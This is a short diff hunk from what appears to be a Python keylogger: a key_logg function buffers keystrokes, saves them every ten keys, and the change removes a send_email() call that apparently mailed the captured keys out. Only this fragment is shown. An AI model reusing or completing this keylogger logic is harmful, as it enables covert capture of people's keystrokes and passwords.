@@ -17,7 +17,7 @@ def key_logg(key):
     if count >= 10 :
         count = 0
         save_key(keys)
-        send_email()
+        
         keys = []
 
 #################################################
